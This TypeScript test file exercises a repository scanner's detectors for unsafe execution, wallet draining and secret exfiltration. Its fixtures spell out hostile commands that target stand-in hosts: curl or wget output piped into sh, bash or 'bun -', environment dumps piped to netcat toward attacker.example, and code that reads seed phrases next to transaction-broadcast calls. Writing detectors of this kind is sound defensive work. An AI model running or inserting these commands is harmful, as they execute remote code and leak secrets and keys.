import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a script that declares an interpreter is scanned as an install surface", () => {
  // PRD section 8: the scan checks install and build scripts. A file whose
  // first two bytes are `#!` runs through that interpreter whatever it is
  // called, so `configure` and other extensionless build scripts execute at
  // build or install time.
  for (const path of ["configure", "scripts/run", "tools/wrapper.in"]) {
    expect({ path, nameOnly: surfacesOf(path) }).toEqual({
      path,
      nameOnly: [],
    });
    const inspection = inspected(path, `#!/bin/sh\nset -eu\n${PAYLOAD}\n`);
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
  }
});

test("only an interpreter line on the first bytes adds a surface", () => {
  // `#` alone, and `#!` anywhere but the first two bytes, are not shebangs.
  for (const text of [
    `# configure\n${PAYLOAD}\n`,
    `\n#!/bin/sh\n${PAYLOAD}\n`,
  ]) {
    const inspection = inspected("configure", text);
    expect(inspection.findings).toEqual([]);
    expect(inspection.coverage.installScripts).toEqual({
      state: "complete",
      items: 0,
    });
  }
  // A document with no interpreter line keeps no surface, so the inventory
  // does not become a blanket text scan.
  expect(surfacesOf("LICENSE")).toEqual([]);
  expect(inspected("LICENSE", "# License\n").findings).toEqual([]);
});

test("changing an interpreter script changes the reviewed inventory", () => {
  const before = inspected("configure", "#!/bin/sh\nexit 0\n");
  const after = inspected("configure", "#!/bin/sh\nset -eu\nexit 0\n");
  expect(Buffer.compare(before.inventory, after.inventory) === 0).toBe(false);
  expect(before.inventorySha256 === after.inventorySha256).toBe(false);
});

test("curl piped to shell with line continuation is detected", () => {
  // A common install-script idiom splits curl flags across lines with backslash
  // continuation. The pattern [^\n|]* used to stop at the first \n, so the
  // pipe and shell command on the next line were invisible to the detector.
  // (?:[^\n|]|\\[ \t]*\r?\n)* advances across continuation lines (LF, CRLF,
  // or backslash with trailing whitespace) to reach the pipe.
  const continuationPayloads = [
    // LF continuations
    "curl -sSL \\\n  https://evil.example/install.sh | sh",
    "curl \\\n  -sSL https://evil.example/install.sh | bash",
    "curl https://evil.example/install.sh \\\n  | bash",
    // CRLF continuations (Windows line endings)
    "curl -sSL \\\r\n  https://evil.example/install.sh | sh",
    "curl https://evil.example/install.sh \\\r\n  | bash",
    // Backslash with trailing space before LF
    "curl -sSL \\ \n  https://evil.example/install.sh | sh",
    "curl https://evil.example/install.sh \\ \n  | bash",
  ];
  for (const payload of continuationPayloads) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
    expect({
      payload,
      findings: inspection.findings.map((f) => f.category),
    }).toEqual({
      payload,
      findings: ["unsafe-execution"],
    });
  }
});

test("recognized Python and shell source keeps its existing unsafe-execution check", () => {
  for (const path of ["tools/check.py", "tools/check.sh"]) {
    const content = path.endsWith(".py")
      ? `#!/usr/bin/env python3\nimport os\nos.system("${PAYLOAD}")\n`
      : `#!/bin/sh\n${PAYLOAD}\n`;
    const inspection = inspected(path, content);
    expect(inspection.coverage.source).toEqual({ state: "complete", items: 1 });
    expect(inspection.coverage.installScripts.items).toBe(0);
    expect(inspection.findings).toContainEqual(
      expect.objectContaining({
        path,
        category: "unsafe-execution",
        severity: "high",
      }),
    );
  }
});

test("seed phrase or private key next to a wallet signing or broadcast method is detected", () => {
  // The wallet-drainer medium rule matches mnemonic/seed-phrase/private-key
  // within 120 chars of a network-send method. `sendTransaction` was already
  // covered, but `sendSignedTransaction`, `signTransaction`, and
  // `sendRawTransaction` each contain `Transaction` after a word-boundary
  // break, so `\bsendTransaction\b` stopped inside them and missed the match.
  const walletDrainerPayloads = [
    // sendSignedTransaction: the method web3.js uses to broadcast a pre-signed tx
    'const mnemonic = "word1 word2 word3"; web3.eth.sendSignedTransaction(rawTx)',
    // signTransaction: signs a transaction with a private key before sending
    "const privateKey = wallet.privateKey; web3.eth.signTransaction(tx, privateKey)",
    // sendRawTransaction: ethers.js / low-level broadcast of a signed raw tx
    'const seedPhrase = words.join(" "); provider.sendRawTransaction(signedTx)',
    // eth_sendRawTransaction: JSON-RPC method used by ethers, viem and raw RPC clients
    'const privateKey = "0xdeadbeef"; provider.request({ method: "eth_sendRawTransaction", params: [signed] })',
    // eth_sendTransaction: JSON-RPC form without pre-signing
    'const mnemonic = "word1 word2 word3"; rpc.call("eth_sendTransaction", tx)',
  ];
  for (const payload of walletDrainerPayloads) {
    const inspection = inspected("scripts/drain.js", `${payload}\n`);
    expect({
      payload,
      findings: inspection.findings.map((f) => f.category),
    }).toEqual({
      payload,
      findings: ["wallet-drainer"],
    });
  }
});

test("env piped to ncat, netcat, or a path-prefixed nc is detected as secret-exfiltration", () => {
  const exfilPayloads = [
    "env | ncat attacker.example 4444",
    "printenv | netcat attacker.example 4444",
    "env | /bin/nc attacker.example 4444",
    "env | sudo nc attacker.example 4444",
    "env | busybox nc attacker.example 4444",
    "env | sudo -E nc attacker.example 4444",
  ];
  for (const payload of exfilPayloads) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
    expect({
      payload,
      findings: inspection.findings.map((f) => f.category),
    }).toEqual({
      payload,
      findings: ["secret-exfiltration"],
    });
  }
});

test("a download piped into bun with an explicit stdin dash is unsafe execution", () => {
  // `bun -` (and `bun run -`) read and run the program from standard input,
  // so a download piped into it executes the download exactly as `| sh`
  // does. Only the explicit `-` forms count: a bare `bun` on a non-TTY
  // prints its help instead of running stdin, and `bunx`, `-e`, `--version`
  // and similar flags select a different program or none.
  const payloads = [
    "curl -fsSL https://evil.example/i.js | bun -",
    "curl -fsSL https://evil.example/i.js | bun run -",
    "wget -qO- https://evil.example/i.js | /usr/local/bin/bun -",
    "curl -fsSL https://evil.example/i.js | /usr/local/bin/bun run -",
    "curl -fsSL https://evil.example/i.js | sudo bun -",
    "curl -fsSL https://evil.example/i.js | env bun -",
    "curl -fsSL https://evil.example/i.js | bun - | grep done",
  ];
  for (const payload of payloads) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
    expect({
      payload,
      findings: inspection.findings.map((f) => f.category),
    }).toEqual({
      payload,
      findings: ["unsafe-execution"],
    });
  }
  for (const payload of [
    "curl -fsSL https://example.com/i.js | bun",
    "curl -fsSL https://example.com/i.js | bunx -",
    "curl -fsSL https://example.com/i.js | bun --version",
    'curl -fsSL https://example.com/i.js | bun -e "console.log(1)"',
    "curl -fsSL https://example.com/i.js | bun -b",
    "curl -fsSL https://example.com/i.js | bun run -s",
    "curl -fsSL https://example.com/i.js | bun run ./local.js",
    "curl -fsSL https://example.com/i.js | bun-wrapper",
  ]) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
    expect({
      payload,
      findings: inspection.findings.map((f) => f.category),
    }).toEqual({ payload, findings: [] });
  }
});
